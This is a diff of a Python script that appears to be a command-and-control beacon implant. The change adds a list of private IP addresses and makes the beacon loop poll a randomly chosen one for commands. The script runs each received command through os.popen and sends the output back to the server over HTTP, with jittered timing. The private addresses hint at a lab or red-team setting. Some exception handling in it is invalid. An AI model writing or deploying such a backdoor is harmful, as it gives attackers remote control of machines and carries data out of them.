@@ -1,6 +1,28 @@
 #!/usr/bin/env python
 import os, requests, time, socket, json, random, sys
 
+ips = [
+		'192.168.5.147',
+		'192.168.5.152',
+		'192.168.5.164',
+		'192.168.5.183',
+		'192.168.5.196',
+		'192.168.5.197',
+		'192.168.5.3',
+		'192.168.5.31',
+		'192.168.5.33',
+		'192.168.5.79',
+		'192.168.5.94',
+		'192.168.6.103',
+		'192.168.6.141',
+		'192.168.6.151',
+		'192.168.6.161',
+		'192.168.6.192',
+		'192.168.6.193',
+		'192.168.6.211',
+		'192.168.6.6',
+		'192.168.6.82'
+]
 
 """
 Function: getIP
@@ -33,12 +55,13 @@ def beacon():
 	while True:
 		cmds = {}
 		ip = getIP()
+		arkIP = random.choice(ips)
 		#random offset to vary beacon timing
 		offset = random.randrange(-7,7)
 
 		#commands from server to run
 		try:
-			commands = requests.get('http://192.168.7.222/beacon?ip={}'.format(ip))
+			commands = requests.get('http://{}/beacon?ip={}'.format(arkIP, ip))
 		except expression as E:
 			pass
 		#catch error for bot not being in botlist on server
@@ -52,7 +75,7 @@ def beacon():
 				cmds[cmd] = os.popen(cmd).read()
 				#send confirmation of command being run
 				try:
-					requests.get('http://192.168.7.222/confirm?ip={}&cmd={}&output={}'.format(ip, cmd, cmds[cmd])) 
+					requests.get('http://{}/confirm?ip={}&cmd={}&output={}'.format(arkIP, ip, cmd, cmds[cmd])) 
 				except expression as E:
 					pass
 			#print commands
